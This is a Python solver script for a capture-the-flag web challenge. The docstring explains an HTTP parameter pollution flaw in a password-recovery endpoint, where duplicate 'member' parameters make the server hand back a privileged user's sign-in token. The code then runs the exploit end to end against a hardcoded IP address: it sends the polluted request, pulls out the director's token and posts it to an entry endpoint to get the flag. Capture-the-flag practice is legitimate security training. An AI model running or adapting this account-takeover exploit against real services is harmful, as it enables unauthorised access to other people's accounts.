#!/usr/bin/env python3
"""Solver: Velvet Rehearsal (WEB, 500 pts).

Vulnerability: HTTP Parameter Pollution in POST /api/recovery.

The endpoint reads ?member= to decide whose mailbox to render. The auth/mailbox
check takes the *first* occurrence of the parameter (== visitor) while the
sign-in token that actually gets stored (and later accepted by /api/entry) is
generated from the *last* occurrence (director). By sending

    POST /api/recovery?member=visitor@studio.test&member=director@studio.test

the response shows the visitor mailbox (so we can read the token), but the token
belongs to the director. Posting that token to /api/entry returns the flag.

Usage: python3 solve.py [base_url]
"""
import sys, re, requests

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://54.72.82.22:8310").rstrip("/")
VISITOR = "visitor@studio.test"
DIRECTOR = "director@studio.test"


def solve(base=BASE):
    s = requests.Session()
    # HTTP parameter pollution: first value passes the visitor check (=> mailbox
    # is returned so we can read the token), last value is the privileged member
    # whose token is actually stored.
    r = s.post(
        base + "/api/recovery",
        params={"member": [VISITOR, DIRECTOR]},  # -> member=visitor..&member=director..
        timeout=20,
    )
    r.raise_for_status()
    token = r.json()["mailbox"][0]["token"]

    e = s.post(base + "/api/entry", json={"token": token}, timeout=20)
    e.raise_for_status()
    body = e.json()
    m = re.search(r"safctf\{[0-9a-fA-F]+\}", body.get("message", ""))
    if not m:
        raise SystemExit("no flag in response: %r" % body)
    return m.group(0)


if __name__ == "__main__":
    flag = solve()
    print(flag)
